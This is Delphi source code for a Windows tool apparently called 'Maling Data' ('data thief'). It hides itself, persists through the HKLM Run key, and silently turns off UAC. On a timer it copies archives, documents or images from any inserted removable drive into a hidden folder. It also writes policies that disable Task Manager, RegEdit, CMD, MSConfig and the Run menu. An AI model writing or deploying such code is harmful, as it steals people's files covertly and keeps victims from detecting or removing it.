unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, Registry;

type
  TForm1 = class(TForm)
    GroupBox1: TGroupBox;
    Button1: TButton;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    Button2: TButton;
    Label1: TLabel;
    ComboBox1: TComboBox;
    Label2: TLabel;
    GroupBox2: TGroupBox;
    CheckBox3: TCheckBox;
    CheckBox4: TCheckBox;
    CheckBox5: TCheckBox;
    CheckBox6: TCheckBox;
    CheckBox7: TCheckBox;
    Label3: TLabel;
    CheckBox8: TCheckBox;
    Timer1: TTimer;
    Timer2: TTimer;
    ListBox1: TListBox;
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure ComboBox1Change(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
  private
    { Private declarations }

    CurVer,CurRun,PolSys,PolExp,ExpAdvan,WinSystem,WinNT,
    AppTitle,isIsi,FileExt: String;

    function GetUserFromWindows: String;
    function MsgBox(const hwn: HWND; title,text: String; btn: Integer=0):Integer;
    function CariDrive:String;
    function FixDrive(drive: String):Boolean;

    procedure SetUsageCPU;
    procedure MuatRegistry;
    procedure CekRegistry;
    procedure TampungString;
    procedure PasangMaling;
    procedure ProcessToRegistry;

    procedure CariFiles(const Drive: String; const SubDir: Boolean);
    procedure BacaRegistry(RootKey: Cardinal; OpenKey, isStr: String;
                            cbox: TCheckBox; isInt: Integer; isValue: Integer=1);
    procedure PasangRegistry(RootKey: Cardinal; OpenKey, StrWrite, isStr: String;
                            isTrue: Boolean; isValue: Integer);
    procedure HapusRegistry(RootKey: Cardinal; OpenKey, isStr: String);

  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

function TForm1.GetUserFromWindows: String;
var
  iLen: Cardinal;
begin
  iLen := 256;
  Result := StringOfChar(#0, iLen);
  GetUserName(PChar(Result), iLen);
  SetLength(Result, iLen);
end;

procedure TForm1.BacaRegistry(RootKey: Cardinal; OpenKey, isStr: String;
                              cbox: TCheckBox; isInt: Integer; isValue: Integer=1);
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := RootKey;
    if Reg.OpenKey(OpenKey,True) then
    if Reg.ValueExists(isStr)=True then
    if isValue=1 then
    begin
      if (Reg.ReadInteger(isStr)=isInt) then cbox.Checked := True
      else cbox.Checked := False;
    end else
    if isValue=0 then
    begin
      if (Reg.ReadString(isStr)=isIsi) then cbox.Checked := True
      else cbox.Checked := False;
    end;
    Reg.CloseKey;
  finally
    Reg.Free;
  end;
end;

function TForm1.MsgBox(const hwn: HWND; title,text: String; btn: Integer=0):Integer;
begin
  Result := MessageBox(hwn, PChar(text), PChar(title), btn);
end;

procedure TForm1.PasangRegistry(RootKey: Cardinal; OpenKey, StrWrite, isStr: String;
                              isTrue: Boolean; isValue: Integer);
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := RootKey;
    if Reg.OpenKey(OpenKey,True) then
    if isTrue = True then
      Reg.WriteInteger(StrWrite, isValue)
    else
      Reg.WriteString(StrWrite, isStr);
    Reg.CloseKey;
  finally
    Reg.Free;
  end;
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  if (Trim(Button1.Caption)='Disable') then
  begin
    MsgBox(Application.Handle,'Information','Process is Activated! Please your Disable Process...');
    Exit;
  end;
  if (Trim(Button2.Caption)='Tools >>') then
  begin
    CekRegistry;
    GroupBox1.Visible := False;
    GroupBox2.Visible := True;
    Button1.Caption := 'Apply';
    Button2.Caption := '<< Back!';
    Exit;
  end;
  if (Trim(Button2.Caption)='<< Back!') then
  begin
    GroupBox1.Visible := True;
    GroupBox2.Visible := False;
    Button1.Caption := 'Activate';
    Button2.Caption := 'Tools >>';
    Exit;
  end;
end;

procedure TForm1.Button1Click(Sender: TObject);
begin
  if (Trim(Button1.Caption)='Activate') then
  begin
    if (Trim(ComboBox1.Text)='Choose Your File Type') then
    begin
      MsgBox(Application.Handle,'Information','Please! Choose your file type...');
      ComboBox1.SetFocus;
      Exit;
    end;
    ListBox1.Items.Clear;
    PasangMaling;
    ProcessToRegistry;
    Timer1.Enabled := True;
    Button1.Caption := 'Disable';
    Form1.Hide;    
    Exit;
  end;
  if (Trim(Button1.Caption)='Disable') then
  begin
    Timer1.Enabled := False;
    Button1.Caption := 'Activate';
    Exit;
  end;
  if (Trim(Button1.Caption)='Apply') then
  begin
    MuatRegistry;
    MsgBox(Application.Handle,'Information','Successfully! Modifed Registry...');
    Exit;
  end;
end;

procedure TForm1.MuatRegistry;
var
  isInt,isNew: Integer;
begin
  isInt:=0;
  isNew:=1;
  TampungString;

  //CMD
  if (CheckBox3.State=cbChecked) then isInt:=1
  else if (CheckBox3.State=cbUnchecked) then isInt:=0;
  PasangRegistry(HKEY_CURRENT_USER,WinSystem,'DisableCMD','',True,isInt); //Normal 0

  //TaskMgr
  if (CheckBox4.State=cbChecked) then isInt:=1
  else if (CheckBox4.State=cbUnchecked) then isInt:=0;
  PasangRegistry(HKEY_CURRENT_USER,PolSys,'DisableTaskMgr','',True,isInt); //Normal 0
  PasangRegistry(HKEY_LOCAL_MACHINE,PolSys,'DisableTaskMgr','',True,isInt); //Normal 0

  //RegEdit
  if (CheckBox5.State=cbChecked) then isInt:=1
  else if (CheckBox5.State=cbUnchecked) then isInt:=0;
  PasangRegistry(HKEY_CURRENT_USER,PolSys,'DisableRegistryTools','',True,isInt); //Normal 0

  //FolderOptions
  if (CheckBox6.State=cbChecked) then isInt:=1
  else if (CheckBox6.State=cbUnchecked) then isInt:=0;
  PasangRegistry(HKEY_CURRENT_USER,PolExp,'NoFolderOptions','',True,isInt); //Normal 0
  PasangRegistry(HKEY_LOCAL_MACHINE,PolExp,'NoFolderOptions','',True,isInt); //Normal 0

  //MenuRun
  if (CheckBox7.State=cbChecked) then
  begin
    isNew:=0; isInt:=1;
  end else
  if (CheckBox7.State=cbUnchecked) then
  begin
    isNew:=1; isInt:=0;
  end;
  PasangRegistry(HKEY_CURRENT_USER,ExpAdvan,'Start_ShowRun','',True,isNew); //Normal 1
  PasangRegistry(HKEY_CURRENT_USER,PolExp,'NoRun','',True,isInt); //Normal 0

  //MSConfig
  if (CheckBox8.State=cbChecked) then isInt:=1
  else if (CheckBox8.State=cbUnchecked) then isInt:=0;
  PasangRegistry(HKEY_LOCAL_MACHINE,WinNT,'DisableConfig','',True,isInt); //Normal 0

end;

procedure TForm1.CekRegistry;
begin
  TampungString;
  //CMD
  BacaRegistry(HKEY_CURRENT_USER,WinSystem,'DisableCMD',CheckBox3,1);
  //TaskMgr
  BacaRegistry(HKEY_CURRENT_USER,PolSys,'DisableTaskMgr',CheckBox4,1);
  BacaRegistry(HKEY_LOCAL_MACHINE,PolSys,'DisableTaskMgr',CheckBox4,1);
  //RegEdit
  BacaRegistry(HKEY_CURRENT_USER,PolSys,'DisableRegistryTools',CheckBox5,1);
  //FolderOptions
  BacaRegistry(HKEY_CURRENT_USER,PolExp,'NoFolderOptions',CheckBox6,1);
  BacaRegistry(HKEY_LOCAL_MACHINE,PolExp,'NoFolderOptions',CheckBox6,1);
  //MenuRun
  BacaRegistry(HKEY_CURRENT_USER,ExpAdvan,'Start_ShowRun',CheckBox7,0);
  BacaRegistry(HKEY_CURRENT_USER,PolExp,'NoRun',CheckBox7,1);
  //MSConfig
  BacaRegistry(HKEY_LOCAL_MACHINE,WinNT,'DisableConfig',CheckBox8,1);
end;

procedure TForm1.TampungString;
begin
  CurVer := '\SOFTWARE\Microsoft\Windows\CurrentVersion';
  PolSys := CurVer+'\Policies\System';
  PolExp := CurVer+'\Policies\Explorer';
  ExpAdvan := CurVer+'\Explorer\Advanced';
  WinSystem := '\Software\Policies\Microsoft\Windows\System';
  WinNT := '\SOFTWARE\Policies\Microsoft\Windows NT';
  CurRun := CurVer+'\Run';
  isIsi := '"'+ParamStr(0)+'"';
  AppTitle := '\SOFTWARE\ArsetSoft\Maling Data\Setings';
end;

procedure TForm1.HapusRegistry(RootKey: Cardinal; OpenKey, isStr: String);
var
  Reg: TRegistry;
begin
  Reg := TRegistry.Create;
  try
    Reg.RootKey := RootKey;
    if Reg.OpenKey(OpenKey, True) then
    if Reg.ValueExists(isStr) then
      Reg.DeleteValue(isStr);
    Reg.CloseKey;
  finally
    Reg.Free;
  end;
end;

procedure TForm1.PasangMaling;
begin
  TampungString;
  //StartUp Registry
  if (CheckBox2.State = cbChecked) then
    PasangRegistry(HKEY_LOCAL_MACHINE,CurRun,GetUserFromWindows,
                  isIsi,False,0)
  else if (CheckBox2.State = cbUnchecked) then
    HapusRegistry(HKEY_LOCAL_MACHINE,CurRun,GetUserFromWindows);
end;

procedure TForm1.SetUsageCPU;
var
  MainHandle: THandle;
begin
  MainHandle := OpenProcess(PROCESS_ALL_ACCESS,False,GetCurrentProcessId);
  SetProcessWorkingSetSize(MainHandle,$FFFFFFFF, $FFFFFFFF);
  CloseHandle(MainHandle);
end;

procedure TForm1.FormCreate(Sender: TObject);
var
  Reg: TRegistry;
begin
  TampungString;
  //StartUp Registry
  BacaRegistry(HKEY_LOCAL_MACHINE,CurRun,GetUserFromWindows,CheckBox2,0,0);
  //Sub Folders
  BacaRegistry(HKEY_LOCAL_MACHINE,AppTitle,'SubFolder',CheckBox1,1);
  //Cek Registry
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_LOCAL_MACHINE;
    if Reg.OpenKey(PolSys,True) then
    if Reg.ValueExists('EnableLUA') then
    if Reg.ReadInteger('EnableLUA')<>0 then
    PasangRegistry(HKEY_LOCAL_MACHINE,PolSys,'EnableLUA','',True,0);
    Reg.CloseKey;

    if Reg.OpenKey(AppTitle,True) then
    if Reg.ValueExists('FileType') then
    if Reg.ReadInteger('FileType')<>0 then
    begin
      ComboBox1.ItemIndex := Reg.ReadInteger('FileType')-1;
      case ComboBox1.ItemIndex of
        0: FileExt := '*.zip|*.rar';
        1: FileExt := '*.doc|*.xls|*.ppt|*.pdf';
        2: FileExt := '*.jpg|*.jpeg|*.png|*.bmp|*.gif';
      end;
      Application.ShowMainForm := False;
      Button1.Click;
    end;
    Reg.CloseKey;
  finally
    Reg.Free;
  end;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
  if (GetAsyncKeyState(VK_CONTROL)<>0) and (GetAsyncKeyState(VK_MENU)<>0) then
  if (GetAsyncKeyState(Ord('E'))<>0) then
  begin
    Form1.Show;
    Button1.Click;
  end;
end;

procedure TForm1.CariFiles(const Drive: String; const SubDir: Boolean);
var
  Rec: TSearchRec;
  Path,s,isBaru: String;
  isPisah: TStringList;
  i: Integer;
begin
  isPisah := TStringList.Create;
  isPisah.Delimiter := '|';
  isPisah.DelimitedText := FileExt;
  Path := IncludeTrailingBackslash(Drive);
  for i:=0 to isPisah.Count -1 do
  if FindFirst(Path+isPisah[i], faAnyFile, Rec)=0 then
  try
    repeat
      isBaru := PChar(ExtractFilePath(Application.ExeName)+GetUserFromWindows);    
      s := PChar(Path+Rec.Name);
      if not DirectoryExists(isBaru) then CreateDirectory(PChar(isBaru),nil);
      if not FileExists(PChar(isBaru+'\'+Rec.Name)) then
      begin
        ListBox1.Items.Add(s);
        CopyFile(PChar(s),PChar(isBaru+'\'+Rec.Name),False);
      end;
    until FindNext(Rec)<>0;
  finally
    FindClose(Rec);
  end;
  If not SubDir then Exit;
  if FindFirst(Path+'*', faDirectory, Rec)=0 then
  try
    repeat
      if ((Rec.Attr and faDirectory)<>0) and
          (Rec.Name<>'.') and (Rec.Name<>'..') then
      CariFiles(Path+Rec.Name, True);
    until FindNext(Rec)<>0;
  finally
    FindClose(Rec);
  end;
end;

function TForm1.FixDrive(drive: String):Boolean;
var
  Dw1, Dw2: DWORD;
begin
  Result := GetVolumeInformation(PChar(drive), nil, 0, nil, Dw1, Dw2, nil, 0);
end;

procedure TForm1.ProcessToRegistry;
var
  isInt: Integer;
begin
  isInt := 0;
  TampungString;
  //Set FileType
  case ComboBox1.ItemIndex of
    0: isInt:= 1;
    1: isInt:= 2;
    2: isInt:= 3;
  end;
  PasangRegistry(HKEY_LOCAL_MACHINE,AppTitle,'FileType','',True,isInt);
  //Set Sub Folders
  if (CheckBox1.State = cbChecked) then isInt := 1
  else if (CheckBox1.State = cbUnchecked) then isInt := 0;
  PasangRegistry(HKEY_LOCAL_MACHINE,AppTitle,'SubFolder','',True,isInt);
end;

function TForm1.CariDrive:String;
var
  Drive: Char;
begin
  for Drive:='A' to 'Z' do
  if (GetDriveType(PChar(Drive+':\'))=DRIVE_REMOVABLE) then
  Result := PChar(Drive+':\');
end;

procedure TForm1.ComboBox1Change(Sender: TObject);
begin
  case ComboBox1.ItemIndex of
    0: FileExt := '*.zip|*.rar';
    1: FileExt := '*.doc|*.xls|*.ppt|*.pdf';
    2: FileExt := '*.jpg|*.jpeg|*.png|*.bmp|*.gif';
  end;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
begin
  //Active Process
  SetUsageCPU;  
  if FixDrive(CariDrive) then
  CariFiles(CariDrive, CheckBox1.State in [cbChecked]);
end;

end.
